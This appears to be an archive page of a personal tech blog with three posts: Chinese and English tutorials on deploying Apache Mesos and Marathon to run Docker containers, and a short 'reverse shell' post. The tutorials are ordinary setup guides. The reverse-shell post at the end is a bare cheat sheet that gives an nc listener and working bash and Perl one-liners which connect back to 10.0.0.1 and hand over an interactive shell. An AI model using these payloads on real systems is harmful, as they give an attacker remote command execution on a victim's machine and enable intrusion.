<!doctype html>



  


<html class="theme-next pisces use-motion">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Cloud, Container, Kubernetes, SDN, Docker" />





  <link rel="alternate" href="/atom.xml" title="Feisky's Blog" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.2" />






<meta name="description" content="Notes about anything.">
<meta property="og:type" content="website">
<meta property="og:title" content="Feisky's Blog">
<meta property="og:url" content="https://feiskyer.github.io/page/17/index.html">
<meta property="og:site_name" content="Feisky's Blog">
<meta property="og:description" content="Notes about anything.">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Feisky's Blog">
<meta name="twitter:description" content="Notes about anything.">



<script type="text/javascript" id="hexo.configuration">
  var NexT = window.NexT || {};
  var CONFIG = {
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"always"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    }
  };
</script>




  <link rel="canonical" href="https://feiskyer.github.io/page/17/"/>


  <title> Feisky's Blog </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

<body itemscope itemtype="//schema.org/WebPage" lang="zh-Hans">

  


<!-- hexo-inject:begin --><!-- hexo-inject:end --><script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-69699206-1', 'auto');
  ga('send', 'pageview');
</script>









  
  
    
  

  <div class="container one-collumn sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Feisky's Blog</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">Notes about anything.</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sre">
          <a href="/SRE" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-linux"></i> <br />
            
            SRE
          </a>
        </li>
      
        
        <li class="menu-item menu-item-container">
          <a href="/container" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-cubes"></i> <br />
            
            容器
          </a>
        </li>
      
        
        <li class="menu-item menu-item-cloud">
          <a href="/cloud" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-cloud"></i> <br />
            
            云计算
          </a>
        </li>
      
        
        <li class="menu-item menu-item-ml">
          <a href="/machine-learning" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-suitcase"></i> <br />
            
            机器学习
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sdn">
          <a href="/sdn/index.html" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-firefox"></i> <br />
            
            SDN网络
          </a>
        </li>
      
        
        <li class="menu-item menu-item-pages">
          <a href="/pages" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            读书笔记
          </a>
        </li>
      
        
        <li class="menu-item menu-item-dis">
          <a href="/distributed" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-database"></i> <br />
            
            分布式系统
          </a>
        </li>
      
        
        <li class="menu-item menu-item-k8s">
          <a href="/kubernetes" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-cube"></i> <br />
            
            Kubernetes
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-commonweal">
          <a href="/404.html" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
            
            公益404
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup">
 <span class="search-icon fa fa-search"></span>
 <input type="text" id="local-search-input">
 <div id="local-search-result"></div>
 <span class="popup-btn-close">close</span>
</div>


    </div>
  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2015/02/05/mesosdocker/" itemprop="url">
                  使用Mesos来管理Docker集群
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2015-02-06T00:00:00+08:00" content="2015-02-06">
              2015-02-06
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/docker/" itemprop="url" rel="index">
                    <span itemprop="name">docker</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2015/02/05/mesosdocker/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/02/05/mesosdocker/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>Apache Mesos能够在同样的集群机器上运行多种分布式系统类型，更加动态有效率低共享资源。提供失败侦测，任务发布，任务跟踪，任务监控，低层次资源管理和细粒度的资源共享，可以扩展伸缩到数千个节点。Mesos已经被Twitter用来管理它们的数据中心。</p>
<p><img src="/assets/mesos_1.png" alt=""></p>
<p>Mesos架构图如下：</p>
<p><img src="/assets/mesos_2.png" alt=""></p>
<p>Mesos框架是一个在Mesos上运行分布式应用的应用程序，它有两个组件：</p>
<ol>
<li>调度器 : 与Mesos交互，订阅资源，然后在mesos从服务器中加载任务。  </li>
<li>执行器 :  从框架的环境变量 配置中获得信息，在mesos从服务器中运行任务。</li>
</ol>
<p>下面看看其是如何实现资源调用？Mesos通过”resources offers” 分配资源，资源其实是当前可用资源的一个快照，调度器将使用这些资源在mesos从服务器上运行任务。</p>
<p>Mesos主从服务器调度资源的顺序图如下：</p>
<p><img src="/assets/mesos_3.png" alt=""></p>
<p>首先由Mesos主服务器查询可用资源给调度器，第二步调度器向主服务器发出加载任务，主服务器再传达给从服务器，从服务器向执行器命令加载任务执行，执行器执行任务以后，将状态反馈上报给从服务器，最终告知调度器 。</p>
<p>从服务器下管理多个执行器，每个执行器是一个容器，以前可以使用Linux容器LXC，现在使用Docker容器。</p>
<p><img src="/assets/mesos_4.png" alt=""></p>
<h3 id="失败恢复和高可用性"><a href="#失败恢复和高可用性" class="headerlink" title="失败恢复和高可用性"></a>失败恢复和高可用性</h3><p>Mesos主服务器使用Zookeeper进行服务选举和发现。它有一个注册器记录了所有运行任何和从服务器信息，使用MultiPaxos进行日志复制实现一致性。</p>
<p>Mesos有一个从服务器恢复机制，无论什么时候一个从服务器死机了，用户的任务还是能够继续运行，从服务器会将一些关键点信息如任务信息 状态更新持久化到本地磁盘上，重新启动时可以从磁盘上恢复运行这些任务(类似Java中的钝化和唤醒)</p>
<h3 id="什么是Marathon"><a href="#什么是Marathon" class="headerlink" title="什么是Marathon"></a>什么是Marathon</h3><p>它是一个mesos框架，能够支持运行长服务，比如web应用等。是集群的分布式Init.d，能够原样运行任何Linux二进制发布版本，如Tomcat Play等等，可以集群的多进程管理。也是一种私有的Pass，实现服务的发现，为部署提供提供REST API服务，有授权和SSL、配置约束，通过HAProxy实现服务发现和负载平衡。  </p>
<p><img src="/assets/mesos_5.png" alt=""></p>
<p>这样，我们可以如同一台Linux主机一样管理数千台服务器，它们的对应原理如下图，使用Marathon类似Linux主机内的init Systemd等外壳管理，而Mesos则不只包含一个Linux核，可以调度数千台服务器的Linux核，实际是一个数据中心的内核：</p>
<p><img src="/assets/mesos_6.png" alt=""></p>
<h3 id="部署方法"><a href="#部署方法" class="headerlink" title="部署方法"></a>部署方法</h3><p>首先安装Mesos和Marathon，并配置slave使用docker：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><div class="line">sudo apt-key adv --keyserver keyserver.ubuntu.<span class="keyword">com</span> --recv E56151BF</div><div class="line">DISTRO=$(lsb_release -<span class="keyword">is</span> | <span class="keyword">tr</span> <span class="string">'[:upper:]'</span> <span class="string">'[:lower:]'</span>)</div><div class="line">CODENAME=$(lsb_release -<span class="keyword">cs</span>)</div><div class="line"><span class="keyword">echo</span> <span class="string">"deb http://repos.mesosphere.io/$&#123;DISTRO&#125; $&#123;CODENAME&#125; main"</span> | \</div><div class="line">  sudo tee /etc/apt/sources.<span class="keyword">list</span>.d/mesosphere.<span class="keyword">list</span></div><div class="line">sudo apt-<span class="built_in">get</span> -<span class="keyword">y</span> <span class="keyword">update</span></div><div class="line">sudo apt-<span class="built_in">get</span> -<span class="keyword">y</span> install mesos marathon</div><div class="line"><span class="keyword">echo</span> <span class="string">'docker,mesos'</span> &gt; /etc/mesos-slave/containerizers</div><div class="line"><span class="keyword">echo</span> <span class="string">'5mins'</span> &gt; /etc/mesos-slave/executor_registration_timeout</div></pre></td></tr></table></figure>
<p>启动所有服务</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><div class="line">sudo service zookeeper restart</div><div class="line">sudo service mesos-<span class="keyword">master</span> <span class="title">start</span></div><div class="line">sudo service mesos-<span class="literal">slave</span> <span class="literal">start</span></div><div class="line">sudo service marathon <span class="literal">start</span></div></pre></td></tr></table></figure>
<p>现在打开浏览器，访问<code>http://localhost:8080</code>和<code>http://localhost:5050</code>就可以分别看到Mesos和Marathon的界面了. </p>
<p><img src="/assets/mesos1.png" alt=""></p>
<p>执行下面的命令，来运行一个简单的任务确认Mesos部署正常：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><div class="line">MASTER=$(mesos-resolve <span class="string">`cat /etc/mesos/zk`</span> <span class="number">2</span>&gt;<span class="regexp">/dev/null</span>)</div><div class="line">mesos-execute --master=$MASTER --name=<span class="string">"cluster-test"</span> --command=<span class="string">"sleep 5"</span></div></pre></td></tr></table></figure>
<h3 id="部署docker容器"><a href="#部署docker容器" class="headerlink" title="部署docker容器"></a>部署docker容器</h3><p>通过Marathon提供了RestAPI，方便管理和部署各种应用，并支持通过HAProxy实现负载均衡。下面我们就通过Rest API来创建docker容器：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><div class="line">curl -X POST -H <span class="string">"Accept: application/json"</span> -H <span class="string">"Content-Type: application/json"</span> <span class="string">http:</span><span class="comment">//localhost:8080/v2/apps -d '&#123;</span></div><div class="line">  <span class="string">"container"</span>: &#123;</div><div class="line">    <span class="string">"type"</span>: <span class="string">"DOCKER"</span>,</div><div class="line">    <span class="string">"docker"</span>: &#123;</div><div class="line">      <span class="string">"image"</span>: <span class="string">"centos"</span></div><div class="line">    &#125;</div><div class="line">  &#125;,</div><div class="line">  <span class="string">"id"</span>: <span class="string">"cent"</span>,</div><div class="line">  <span class="string">"instances"</span>: <span class="number">1</span>,</div><div class="line">  <span class="string">"cpus"</span>: <span class="number">0.5</span>,</div><div class="line">  <span class="string">"mem"</span>: <span class="number">512</span>,</div><div class="line">  <span class="string">"uris"</span>: [],</div><div class="line">  <span class="string">"cmd"</span>: <span class="string">"while sleep 10; do date -u +%T; done"</span></div><div class="line">&#125;<span class="string">'</span></div></pre></td></tr></table></figure>
<p>返回数据为：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"id"</span>: <span class="string">"/cent"</span>,</div><div class="line">    <span class="attr">"cmd"</span>: <span class="string">"while sleep 10; do date -u +%T; done"</span>,</div><div class="line">    <span class="attr">"args"</span>: <span class="literal">null</span>,</div><div class="line">    <span class="attr">"user"</span>: <span class="literal">null</span>,</div><div class="line">    <span class="attr">"env"</span>: &#123;</div><div class="line">    &#125;,</div><div class="line">    <span class="attr">"instances"</span>: <span class="number">1</span>,</div><div class="line">    <span class="attr">"cpus"</span>: <span class="number">0.5</span>,</div><div class="line">    <span class="attr">"mem"</span>: <span class="number">512.0</span>,</div><div class="line">    <span class="attr">"disk"</span>: <span class="number">0.0</span>,</div><div class="line">    <span class="attr">"executor"</span>: <span class="string">""</span>,</div><div class="line">    <span class="attr">"constraints"</span>: [</div><div class="line">    ],</div><div class="line">    <span class="attr">"uris"</span>: [</div><div class="line">    ],</div><div class="line">    <span class="attr">"storeUrls"</span>: [</div><div class="line">    ],</div><div class="line">    <span class="attr">"ports"</span>: [</div><div class="line">        <span class="number">0</span></div><div class="line">    ],</div><div class="line">    <span class="attr">"requirePorts"</span>: <span class="literal">false</span>,</div><div class="line">    <span class="attr">"backoffSeconds"</span>: <span class="number">1</span>,</div><div class="line">    <span class="attr">"backoffFactor"</span>: <span class="number">1.15</span>,</div><div class="line">    <span class="attr">"maxLaunchDelaySeconds"</span>: <span class="number">3600</span>,</div><div class="line">    <span class="attr">"container"</span>: &#123;</div><div class="line">        <span class="attr">"type"</span>: <span class="string">"DOCKER"</span>,</div><div class="line">        <span class="attr">"volumes"</span>: [</div><div class="line">        ],</div><div class="line">        <span class="attr">"docker"</span>: &#123;</div><div class="line">            <span class="attr">"image"</span>: <span class="string">"centos"</span>,</div><div class="line">            <span class="attr">"network"</span>: <span class="literal">null</span>,</div><div class="line">            <span class="attr">"portMappings"</span>: <span class="literal">null</span>,</div><div class="line">            <span class="attr">"privileged"</span>: <span class="literal">false</span>,</div><div class="line">            <span class="attr">"parameters"</span>: [</div><div class="line">            ]</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line">    <span class="attr">"healthChecks"</span>: [</div><div class="line">    ],</div><div class="line">    <span class="attr">"dependencies"</span>: [</div><div class="line">    ],</div><div class="line">    <span class="attr">"upgradeStrategy"</span>: &#123;</div><div class="line">        <span class="attr">"minimumHealthCapacity"</span>: <span class="number">1.0</span>,</div><div class="line">        <span class="attr">"maximumOverCapacity"</span>: <span class="number">1.0</span></div><div class="line">    &#125;,</div><div class="line">    <span class="attr">"labels"</span>: &#123;</div><div class="line">    &#125;,</div><div class="line">    <span class="attr">"version"</span>: <span class="string">"2015-02-06T01:25:27.392Z"</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>此时，通过Marathon的界面<a href="http://localhost:8080" target="_blank" rel="external">http://localhost:8080</a>就可以看到已经有一个app在Deploying了，稍等一会该状态会变成Running。在Slave上执行<code>docker ps</code>也可以看到正在运行的容器。</p>
<p>Mesos也支持通过端口映射将容器内部的服务开放出来：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><div class="line">curl -X POST -H <span class="string">"Accept: application/json"</span> -H <span class="string">"Content-Type: application/json"</span> <span class="string">http:</span><span class="comment">//localhost:8080/v2/apps -d '&#123;</span></div><div class="line">  <span class="string">"id"</span>: <span class="string">"webserver"</span>,</div><div class="line">  <span class="string">"cmd"</span>: <span class="string">"python -m SimpleHTTPServer 8080"</span>,</div><div class="line">  <span class="string">"cpus"</span>: <span class="number">0.5</span>,</div><div class="line">  <span class="string">"mem"</span>: <span class="number">64.0</span>,</div><div class="line">  <span class="string">"instances"</span>: <span class="number">1</span>,</div><div class="line">  <span class="string">"container"</span>: &#123;</div><div class="line">    <span class="string">"type"</span>: <span class="string">"DOCKER"</span>,</div><div class="line">    <span class="string">"docker"</span>: &#123;</div><div class="line">      <span class="string">"image"</span>: <span class="string">"centos"</span>,</div><div class="line">      <span class="string">"network"</span>: <span class="string">"BRIDGE"</span>,</div><div class="line">      <span class="string">"portMappings"</span>: [</div><div class="line">        &#123; <span class="string">"containerPort"</span>: <span class="number">8080</span>, <span class="string">"hostPort"</span>: <span class="number">0</span>, <span class="string">"servicePort"</span>: <span class="number">9000</span>, <span class="string">"protocol"</span>: <span class="string">"tcp"</span> &#125;</div><div class="line">      ]</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;<span class="string">'</span></div></pre></td></tr></table></figure>
<p><img src="/assets/mesos2.png" alt=""></p>
<h3 id="部署其他应用"><a href="#部署其他应用" class="headerlink" title="部署其他应用"></a>部署其他应用</h3><p>前面是通过单机来测试了Mesos部署docker的功能的，而Mesos通常都是用在集群中，关于Mesos集群的部署请参考<a href="http://mesosphere.com/docs/getting-started/datacenter/install/" target="_blank" rel="external">http://mesosphere.com/docs/getting-started/datacenter/install/</a>.</p>
<p>Mesos支持部署各种集群应用，如Kubernets、Hadoop、Spark、Chronos、Storm等，具体部署方法参考<a href="http://mesosphere.com/docs/tutorials/" target="_blank" rel="external">http://mesosphere.com/docs/tutorials/</a>.</p>
<h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><ul>
<li><a href="http://mesosphere.com/docs/getting-started/developer/single-node-install/" target="_blank" rel="external">http://mesosphere.com/docs/getting-started/developer/single-node-install/</a></li>
<li><a href="http://mesosphere.com/docs/tutorials/" target="_blank" rel="external">http://mesosphere.com/docs/tutorials/</a></li>
<li><a href="http://mesosphere.com/docs/getting-started/datacenter/install/" target="_blank" rel="external">http://mesosphere.com/docs/getting-started/datacenter/install/</a></li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2015/02/04/deploy-a-mesos-cluster-using-docker/" itemprop="url">
                  Deploy a Mesos Cluster Using Docker
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2015-02-05T00:00:00+08:00" content="2015-02-05">
              2015-02-05
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/mesos/" itemprop="url" rel="index">
                    <span itemprop="name">mesos</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2015/02/04/deploy-a-mesos-cluster-using-docker/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/02/04/deploy-a-mesos-cluster-using-docker/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>his tutorial will show you how to bring up a single node <a href="http://mesosphere.com/" target="_blank" rel="external">Mesos</a> cluster all provisioned out using <a href="http://docker.io/" target="_blank" rel="external">Docker</a> containers (a future post will show how to easily scale this out to multi nodes or see the update on the bottom). This means that you can startup an entire cluster with 7 commands! Nothing to install except for starting out with a working Docker server.</p>
<p>This will startup 4 containers:</p>
<ol>
<li>ZooKeeper</li>
<li>Meso Master</li>
<li>Marathon</li>
<li>Mesos Slave Container</li>
</ol>
<p>As mentioned the only prerequisite is to have a working Docker server. This means you can bring up a local <a href="https://docs.vagrantup.com/v2/provisioning/docker.html" target="_blank" rel="external">Vagrant box with Docker installed</a>, use <a href="http://boot2docker.io/" target="_blank" rel="external">Boot2Docker</a>, use <a href="https://coreos.com/" target="_blank" rel="external">CoreOS</a>, instance on AWS, or however you like to get a Docker server.</p>
<p>The entire process is outlined in this Github repository: <a href="https://github.com/sekka1/mesosphere-docker" target="_blank" rel="external">https://github.com/sekka1/mesosphere-docker</a></p>
<p>All of the Docker container build files used are there also. You can build each container locally or just use the pre-built containers located on the Docker Hub. The commands below will automatically download the needed pre-built containers for you.</p>
<p>ZooKeeper: <a href="https://registry.hub.docker.com/u/garland/zookeeper/" target="_blank" rel="external">https://registry.hub.docker.com/u/garland/zookeeper/</a></p>
<p>Meso Master: <a href="https://registry.hub.docker.com/u/garland/mesosphere-docker-mesos-master/" target="_blank" rel="external">https://registry.hub.docker.com/u/garland/mesosphere-docker-mesos-master/</a></p>
<p>Marathon:  <a href="https://registry.hub.docker.com/u/garland/mesosphere-docker-marathon/" target="_blank" rel="external">https://registry.hub.docker.com/u/garland/mesosphere-docker-marathon/</a></p>
<h3 id="Lets-Get-Started"><a href="#Lets-Get-Started" class="headerlink" title="Lets Get Started"></a>Lets Get Started</h3><p><strong>Step 1:</strong> Get the IP of the Docker server and export it out to the environment. We will use this IP over and over again in subsequent Docker commands.</p>
<p>Just as a note, this is the IP address of the server and not docker0 or an IP address inside a Docker container. If you ssh into your server and run the command “ifconfig” use the eth0 interface’s address.</p>
<pre name="feb0" id="feb0" class="graf--pre">
root@docker-server:/# HOST_IP=10.11.31.7
</pre>

<p><strong>Step 2:</strong> Start the ZooKeeper container.</p>
<pre name="c73f" id="c73f" class="graf--pre">
docker run -d \  
-p 2181:2181 \  
-p 2888:2888 \  
-p 3888:3888 \  
garland/zookeeper
</pre>

<p><strong>Step 3:</strong> Start Mesos Master</p>
<pre name="9331" id="9331" class="graf--pre">
docker run --net="host" \  
-p 5050:5050 \  
-e "MESOS_HOSTNAME=${HOST_IP}" \  
-e "MESOS_IP=${HOST_IP}" \  
-e "MESOS_ZK=zk://${HOST_IP}:2181/mesos" \  
-e "MESOS_PORT=5050" \  
-e "MESOS_LOG_DIR=/var/log/mesos" \  
-e "MESOS_QUORUM=1" \  
-e "MESOS_REGISTRY=in_memory" \  
-e "MESOS_WORK_DIR=/var/lib/mesos" \  
-d \  
garland/mesosphere-docker-mesos-master
</pre>

<p><strong>Step 4:</strong> Start Marathon</p>
<pre name="a717" id="a717" class="graf--pre">
docker run \  
-d \  
-p 8080:8080 \  
garland/mesosphere-docker-marathon --master zk://${HOST_IP}:2181/mesos --zk zk://${HOST_IP}:2181/marathon
</pre>

<p><strong>Step 5:</strong> Start Mesos Slave in a container</p>
<pre name="e983" id="e983" class="graf--pre">
docker run -d \  
--name mesos_slave_1 \  
--entrypoint="mesos-slave" \  
-e "MESOS_MASTER=zk://${HOST_IP}:2181/mesos" \  
-e "MESOS_LOG_DIR=/var/log/mesos" \  
-e "MESOS_LOGGING_LEVEL=INFO" \  
garland/mesosphere-docker-mesos-master:latest
</pre>

<p><strong>Step 6:</strong> Goto the Mesos’ webpage</p>
<p>Depending on how you brought up your Docker server and it’s IP address you might have to change the IP you point your browser to but the port will be the same.</p>
<p>The Mesos webpage will be at this address:</p>
<pre name="0000" id="0000" class="graf--pre">
http://${HOST_IP}:5050
</pre>

<p>Then you should get a page like this but probably at first without all the items in the “Tasks” tables.</p>
<figure name="d978" id="d978" class="graf--figure">
    <div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 554px;">
        <div class="aspect-ratio-fill" style="padding-bottom: 79.2%;"></div>![](https://d262ilb51hltx0.cloudfront.net/max/1010/1*jaUBLpqWBgviqteTk4CuTQ.png)
    </div>
</figure>

<p><strong>Step 7:</strong> Goto Marathon’s webpage to start a job</p>
<p>The Marathon webpage lets you schedule long running tasks onto the Meso Slave container. This is a good test to see if your cluster is up and running. You can view the Marathon’s webpage at:</p>
<pre name="d885" id="d885" class="graf--pre">
http://${HOST_IP}:8080
</pre>

<figure name="dbcb" id="dbcb" class="graf--figure">
    <div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 189px;">
        <div class="aspect-ratio-fill" style="padding-bottom: 27%;"></div>![](https://d262ilb51hltx0.cloudfront.net/max/1400/1*0dKOQ7S8Sc53dTK1tezVLA.png)
    </div>
</figure>

<p>Clicking on the “New App” button on the top right gives you the following menu where you can create a new job/task. We are simply going to echo out hello to a file. We can go into the container and check if the file is created and if the job is continuously running.</p>
<figure name="7586" id="7586" class="graf--figure">
    <div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 1096px;">
        <div class="aspect-ratio-fill" style="padding-bottom: 156.6%;"></div>![](https://d262ilb51hltx0.cloudfront.net/max/700/1*T2RuhLQE5xawA_whqbB7ig.png)
    </div>
</figure>

<p><strong>Step 8:</strong> Check if job/task is running</p>
<p>Lets check if the job/task is continuously running on the Mesos Slave.</p>
<p>On the Docker server run the following commands. It will place you inside the slave container and from there tail out the output.txt file.</p>
<pre name="ff5e" id="ff5e" class="graf--pre">
docker exec -it mesos_slave_1 /bin/bash  
root@ca83bf0ea76a:/# tail -f /tmp/output.txt
</pre>

<p>You will see “hello” being placed into this file about once a second.</p>
<p>Update: I just updated this projects doc to include how to setup a multi node environment: <a href="https://github.com/sekka1/mesosphere-docker#multi-node-setup" target="_blank" rel="external">https://github.com/sekka1/mesosphere-docker#multi-node-setup</a></p>
<p>Here is the same article but translated to Chinese: <a href="http://dockerone.com/article/136" target="_blank" rel="external">http://dockerone.com/article/136</a></p>
<p>From <a href="https://medium.com/@gargar454/deploy-a-mesos-cluster-with-7-commands-using-docker-57951e020586" target="_blank" rel="external">medium gargar454</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2015/01/27/reverse-shell/" itemprop="url">
                  reverse shell
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2015-01-28T00:00:00+08:00" content="2015-01-28">
              2015-01-28
            </time>
          </span>

          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2015/01/27/reverse-shell/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/01/27/reverse-shell/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="Listen-for-8080-first"><a href="#Listen-for-8080-first" class="headerlink" title="Listen for 8080 first"></a>Listen for 8080 first</h3><pre>
nc -l -p 8080 -vvv
</pre>

<h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><p>Some versions of <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/" target="_blank" rel="external">bash can send you a reverse shell</a> (this was tested on Ubuntu 10.10):</p>
<pre>
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
</pre>

<h3 id="PERL"><a href="#PERL" class="headerlink" title="PERL"></a>PERL</h3><p>Here’s a shorter, feature-free version of the <a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell" target="_blank" rel="external">perl-reverse-shell</a>:</p>
<pre>
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
</pre>

